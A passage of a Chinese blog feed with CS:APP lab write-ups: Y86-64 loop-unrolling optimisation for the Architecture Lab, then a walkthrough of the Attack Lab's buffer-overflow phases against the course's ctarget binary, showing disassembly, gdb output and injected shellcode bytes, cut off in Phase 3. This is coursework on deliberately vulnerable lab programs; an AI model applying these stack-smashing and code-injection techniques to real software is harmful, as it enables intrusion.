class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text"># You can modify this portion<br>    # Loop header<br>    xorq %rax,%rax      # count = 0;<br>    andq %rdx,%rdx      # len &lt;= 0?<br>    jle Done        # if so, goto Done:<br><br>Loop:   mrmovq (%rdi), %r10 # read val from src...<br>    rmmovq %r10, (%rsi) # ...and store it to dst<br>    andq %r10, %r10     # val &lt;= 0?<br>    jle Npos        # if so, goto Npos:<br>    irmovq $1, %r10<br>    addq %r10, %rax     # count++<br>Npos:   irmovq $1, %r10<br>    subq %r10, %rdx     # len--<br>    irmovq $8, %r10<br>    addq %r10, %rdi     # src++<br>    addq %r10, %rsi     # dst++<br>    andq %rdx,%rdx      # len &gt; 0?<br>    jg Loop         # if so, goto Loop:<br></code></pre></td></tr></table></figure><p>利用iaddq替换原有的赋值指令。替换后</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># You can modify this portion</span><br>    <span class="hljs-comment"># Loop header</span><br>    xorq %rax,%rax      <span class="hljs-comment"># count = 0;</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &lt;= 0?</span><br>    jle Done        <span class="hljs-comment"># if so, goto Done:</span><br><br>Loop:   <br>    mrmov<span class="hljs-string">q (%rdi)</span>, %r10 <span class="hljs-comment"># read val from src...</span><br>    rmmovq %r10, (%rsi) <span class="hljs-comment"># ...and store it to dst</span><br>    andq %r10, %r10     <span class="hljs-comment"># val &lt;= 0?</span><br>    jle Npos        <span class="hljs-comment"># if so, goto Npos:</span><br>    iaddq $1, %rax      <span class="hljs-comment"># count++</span><br>Npos:   <br>    iaddq $-<span class="hljs-number">1</span>, %rdx     <span class="hljs-comment"># len--</span><br>    iaddq $8, %rdi      <span class="hljs-comment"># src++</span><br>    iaddq $8, %rsi      <span class="hljs-comment"># dst++</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &gt; 0?</span><br>    jg Loop         <span class="hljs-comment"># if so, goto Loop:</span><br></code></pre></td></tr></table></figure><p>根据文档的提示，我们尝试使用循环展开对程序进行优化，循环展开通过增加每次迭代计算的元素的数量，减少循环的迭代次数来提升效率。</p><p>本文在参考了别人的博文的基础上使用6路循环展开</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Loop header</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &lt;= 0?</span><br>    jmp test<br>Loop:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle Loop1<br>    iaddq $1,%rax<br>Loop1:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle Loop2<br>    iaddq $1,%rax<br>Loop2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    andq %r8,%r8<br>    jle Loop3<br>    iaddq $1,%rax<br>Loop3:<br>    mrmovq <span class="hljs-number">24</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">24</span>(%rsi)<br>    andq %r8,%r8<br>    jle Loop4<br>    iaddq $1,%rax<br>Loop4:<br>    mrmovq <span class="hljs-number">32</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">32</span>(%rsi)<br>    andq %r8,%r8<br>    jle Loop5<br>    iaddq $1,%rax<br>Loop5:<br>    mrmovq <span class="hljs-number">40</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">40</span>(%rsi)<br>    iaddq $48,%rdi<br>    iaddq $48,%rsi<br>    andq %r8,%r8<br>    jle test<br>    iaddq $1,%rax   <br>test:<br>    iaddq $-<span class="hljs-number">6</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够6个</span><br>    jge Loop                <span class="hljs-comment"># 6路展开</span><br>    iaddq $-<span class="hljs-number">8</span>,%rdi<br>    iaddq $-<span class="hljs-number">8</span>,%rsi<br>    iaddq $6, %rdx<br>    jmp test2               <span class="hljs-comment">#剩下的</span><br>Lore:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle test2<br>    iaddq $1,%rax<br>test2:<br>    iaddq $8,%rdi<br>    iaddq $8,%rsi<br>    iaddq $-<span class="hljs-number">1</span>, %rdx<br>    jge Lore<br></code></pre></td></tr></table></figure><p><strong>逻辑简单</strong>：每次循环都对6个数进行复制，每次复制就设置一个条件语句判断返回时是否加1，对于剩下的数据每次循环只对1个数进行复制。</p><p>此时测试发现对于小数据的CPE值非常大，需要考虑对小数据进行优化。</p><p>于是对剩余数据采取3路循环展开。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs perl">test:<br>    iaddq $-<span class="hljs-number">6</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够6个</span><br>    jge Loop                <span class="hljs-comment"># 6路展开</span><br>    iaddq $6, %rdx<br>    jmp test2               <span class="hljs-comment">#剩下的</span><br><br>L:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle L1<br>    iaddq $1,%rax<br>L1:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle L2<br>    iaddq $1,%rax<br>L2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    iaddq $24,%rdi<br>    iaddq $24,%rsi<br>    andq %r8,%r8<br>    jle test2<br>    iaddq $1,%rax<br>test2:<br>    iaddq $-<span class="hljs-number">3</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够3个</span><br>    jge L<br>    iaddq $2, %rdx          <span class="hljs-comment"># -1则不剩了，直接Done,0 剩一个, 1剩2个</span><br>    je R<span class="hljs-number">0</span><br>    jl Done<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle R2<br>    iaddq $1,%rax<br>R2:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle Done<br>    iaddq $1,%rax<br>    jmp Done<br>R<span class="hljs-number">0</span>:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    rmmovq %r8,(%rsi)<br>    andq %r8,%r8<br>    jle Done<br>    iaddq $1,%rax<br></code></pre></td></tr></table></figure><h4 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h4><p>程序多次使用</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>   rmmovq %r8,(%rsi)<br></code></pre></td></tr></table></figure><p>使用转发避免数据冒险，也至少会有一个气泡。</p><p>另外一种优化方法是多取一个寄存器，连续进行两次数据复制</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">mrmov<span class="hljs-string">q (%rdi)</span>, %r8<br>mrmovq <span class="hljs-number">8</span>(%rdi), %r9<br>rmmovq %r8, (%rsi)<br>rmmovq %r9, <span class="hljs-number">8</span>(%rsi)<br></code></pre></td></tr></table></figure><p>源程序如下</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Loop header</span><br>    andq %rdx,%rdx      <span class="hljs-comment"># len &lt;= 0?</span><br>    jmp test<br>Loop:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    rmmovq %r9,<span class="hljs-number">8</span>(%rsi)<br>    jle Loop1<br>    iaddq $1,%rax<br>Loop1:  <br>    andq %r9,%r9<br>    jle Loop2<br>    iaddq $1,%rax<br>Loop2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    mrmovq <span class="hljs-number">24</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    rmmovq %r9,<span class="hljs-number">24</span>(%rsi)<br>    jle Loop3<br>    iaddq $1,%rax<br>Loop3:  <br>    andq %r9,%r9<br>    jle Loop4<br>    iaddq $1,%rax<br>Loop4:<br>    mrmovq <span class="hljs-number">32</span>(%rdi),%r8<br>    mrmovq <span class="hljs-number">40</span>(%rdi),%r9<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">32</span>(%rsi)<br>    rmmovq %r9,<span class="hljs-number">40</span>(%rsi)<br>    jle Loop5<br>    iaddq $1,%rax<br>Loop5:<br>    iaddq $48,%rdi<br>    iaddq $48,%rsi      <br>    andq %r9,%r9<br>    jle test<br>    iaddq $1,%rax<br>test:<br>    iaddq $-<span class="hljs-number">6</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够6个</span><br>    jge Loop                <span class="hljs-comment"># 6路展开</span><br>    iaddq $6, %rdx<br>    jmp test2               <span class="hljs-comment">#剩下的</span><br><br>L:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    jle L1<br>    iaddq $1,%rax<br>L1:<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r8<br>    andq %r8,%r8<br>    rmmovq %r8,<span class="hljs-number">8</span>(%rsi)<br>    jle L2<br>    iaddq $1,%rax<br>L2:<br>    mrmovq <span class="hljs-number">16</span>(%rdi),%r8<br>    iaddq $24,%rdi<br>    rmmovq %r8,<span class="hljs-number">16</span>(%rsi)<br>    iaddq $24,%rsi<br>    andq %r8,%r8<br>    jle test2<br>    iaddq $1,%rax<br>test2:<br>    iaddq $-<span class="hljs-number">3</span>, %rdx         <span class="hljs-comment"># 先减，判断够不够3个</span><br>    jge L<br>    iaddq $2, %rdx          <span class="hljs-comment"># -1则不剩了，直接Done,0 剩一个, 1剩2个</span><br>    je R<span class="hljs-number">0</span><br>    jl Done<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    mrmovq <span class="hljs-number">8</span>(%rdi),%r9<br>    rmmovq %r8,(%rsi)<br>    rmmovq %r9,<span class="hljs-number">8</span>(%rsi)<br>    andq %r8,%r8<br>    jle R2<br>    iaddq $1,%rax<br>R2:<br>    andq %r9,%r9<br>    jle Done<br>    iaddq $1,%rax<br>    jmp Done<br>R<span class="hljs-number">0</span>:<br>    mrmov<span class="hljs-string">q (%rdi)</span>,%r8<br>    andq %r8,%r8<br>    rmmovq %r8,(%rsi)<br>    jle Done<br>    iaddq $1,%rax<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Average</span> CPE     <span class="hljs-number">8</span>.<span class="hljs-number">16</span><br><span class="hljs-attribute">Score</span>   <span class="hljs-number">46</span>.<span class="hljs-number">7</span>/<span class="hljs-number">60</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>csapp第四章对于我来讲太难了，但在自己亲手设计指令的过程中能模拟流水线的工作流程并尝试优化，让我这个noob得以一窥处理器体系结构的冰山一角。</li><li>本lab同之前的lab一样，诚意满满，yas、yis、ssim、psim等模拟、测试工具一应俱全，整个过程如同游戏闯关一样令人着迷。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>architecure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp attack_lab</title>
    <link href="/2023/09/07/csapp-data-lab/"/>
    <url>/2023/09/07/csapp-data-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="The-Attack-Lab-Understanding-Buffer-Overflow-Bugs"><a href="#The-Attack-Lab-Understanding-Buffer-Overflow-Bugs" class="headerlink" title="The Attack Lab: Understanding Buffer Overflow Bugs"></a>The Attack Lab: Understanding Buffer Overflow Bugs</h1><p>在2个程序上对不同的安全漏洞生成5次攻击。这才是信息安全吗（xd</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230729210310548.png" alt="Figure 1: Summary of attack lab phases"></p><p>官方说明文档中指出了需要做的几个<code>phase</code></p><h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase_1"></a>Phase_1</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><code>test</code>函数的源码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span><br>&#123;<br> <span class="hljs-type">int</span> val;<br> val = getbuf();<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数调用了<code>getbuf</code>函数</p><p>我们的攻击目标是改变程序第五行打印字符串这一行为，让程序返回到<code>touch1</code>。</p><p>touch1的c代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">void</span> <span class="hljs-title function_">touch1</span><span class="hljs-params">()</span><br> &#123;<br>vlevel = <span class="hljs-number">1</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch1!: You called touch1()\n&quot;</span>);<br>validate(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反汇编test"><a href="#反汇编test" class="headerlink" title="反汇编test"></a>反汇编<code>test</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function test:<br>   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp<br>   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax<br>   0x0000000000401971 &lt;+9&gt;:     call   0x4017a8 &lt;getbuf&gt;<br>   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx<br>   0x0000000000401978 &lt;+16&gt;:    mov    $0x403188,%esi<br>   0x000000000040197d &lt;+21&gt;:    mov    $0x1,%edi<br>   0x0000000000401982 &lt;+26&gt;:    mov    $0x0,%eax<br>   0x0000000000401987 &lt;+31&gt;:    call   0x400df0 &lt;__printf_chk@plt&gt;<br>   0x000000000040198c &lt;+36&gt;:    add    $0x8,%rsp<br>   0x0000000000401990 &lt;+40&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><h3 id="反汇编getbuf"><a href="#反汇编getbuf" class="headerlink" title="反汇编getbuf"></a>反汇编<code>getbuf</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function getbuf:<br>   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br>   0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;<br>   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax<br>   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp<br>   0x00000000004017bd &lt;+21&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>第二行分配了40个字节的栈帧。</p><p>运行到第五行时，栈内的情况如下：</p><table><thead><tr><th><code>test函数 的栈帧</code></th><th></th></tr></thead><tbody><tr><td></td><td><code>**返回地址</code>**</td></tr><tr><td><code>getbuf</code>函数的栈帧</td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><p>于是我们不难想到，只需要输入41个字节的字符，最后一个字节覆盖掉原来的返回地址，变为<code>touch1</code>的地址，这样程序就会跳转。</p><p>查看<code>touch1</code>的地址为0x4017c0</p><h3 id="创建exploit-string"><a href="#创建exploit-string" class="headerlink" title="创建exploit string"></a>创建exploit string</h3><p>使用工具<code>HEX2RAW</code>，从txt生成文本，详见官方文档。（注意使用小端存储</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230729222029134.png" alt="exploit txt"></p><p>攻击成功</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">./ctarget -qi <span class="hljs-built_in">a1</span>.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230729222132333.png" alt="attack"></p><h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase_2"></a>Phase_2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> val)</span><br>&#123;<br>    vlevel = <span class="hljs-number">2</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);<br>        fail(<span class="hljs-number">2</span>);<br>        &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>文档指出：不仅需要返回修改地址调用<code>touch2</code>，还需要把<code>cookie</code>作为参数传入，且不建议使用<code>jmp</code>和<code>call</code>指令进行跳转，只能通过在栈中保存目标代码的地址，以<code>ret</code>的形式进行跳转。</p><p>不难想到，PC程序寄存器，<code>%rip</code>，时刻指向程序要执行的下一条指令在内存中的位置，而<code>ret</code>指令就相当于<code>pop %rip</code>。把栈中存放的地址弹出作为下下一条指令的地址。</p><p>函数的第一个参数放在<code>%rdi</code>寄存器中，需要使用汇编语言实现，其思路如下：</p><ul><li>将正常返回地址设置成注入代码的地址，直接在栈顶注入</li><li><code>cookie</code>的值写在<code>%rdi</code>里</li><li>获取<code>touch2</code>的首地址</li><li>在<code>ret</code>弹出前将<code>touch2</code>地址压入栈</li></ul><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230730104234922.png" alt="汇编"></p><p>使用<code>gcc</code>编译，在使用<code>objdump</code>反汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi<br>   7:   68 ec 17 40 00          push   $0x4017ec<br>   c:   c3                      ret<br></code></pre></td></tr></table></figure><p>使用<code>gdb</code>下断点判断<code>rsp</code>中的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) break getbuf<br>Breakpoint 1 at 0x4017a8: file buf.c, line 12.<br>(gdb) r -qi a1.txt<br>Starting program: /home/hydra/target1/ctarget -qi a1.txt<br>Cookie: 0x59b997fa<br>Breakpoint 1, getbuf () at buf.c:12<br>12      buf.c: No such file or directory.<br>(gdb) disas<br>Dump of assembler code for function getbuf:<br>=&gt; 0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp<br>   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi<br>   0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;<br>   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax<br>   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp<br>   0x00000000004017bd &lt;+21&gt;:    ret<br>End of assembler dump.<br>(gdb) stepi<br>14      in buf.c<br>(gdb) p/x $rsp<br>$1 = 0x5561dc78<br></code></pre></td></tr></table></figure><p><code>0x5561dc78</code>即是我们要修改的返回地址。</p><p>程序在执行完<code>getbuf</code>的ret后，<code>%rsp</code>指向<code>caller</code>的返回地址，但这个时候，返回地址的已经被我们修改为<code>0x5561dc78</code>，而这个地址存放的应该是我们写的代码</p><p>那么exploit txt即为</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230730105051596.png" alt="exploit txt"></p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230730105431531.png" alt="attack"></p><h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h2><p>Phase 3 also involves a code injection attack, but passing a string as argument.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">touch3</span><span class="hljs-params">(<span class="hljs-type">char</span> *sval)</span><br>&#123;<br>    vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br>    <span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);<br>        fail(<span class="hljs-number">3</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>touch3</code>调用了<code>hexmatch</code>，其c语言表示为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs 